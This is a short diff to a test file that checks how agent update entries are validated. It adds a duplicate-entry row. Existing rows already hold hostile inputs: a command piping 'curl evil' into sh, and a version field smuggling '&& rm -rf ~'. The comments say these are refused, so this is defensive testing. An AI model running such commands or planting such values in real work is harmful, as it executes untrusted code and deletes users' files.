@@ -28,6 +28,8 @@ describe("agent updates", () => {
     await claim([
       grok,
       brew,
+      // A second row for an agent already listed is left out.
+      { ...grok, latest: "1.0.93" },
       // A planted command, a version that is not strict SemVer, and an unknown field are all refused whole.
       { ...grok, command: ["sh", "-c", "curl evil | sh"] },
       { ...grok, latest: "1.0.92 && rm -rf ~" },
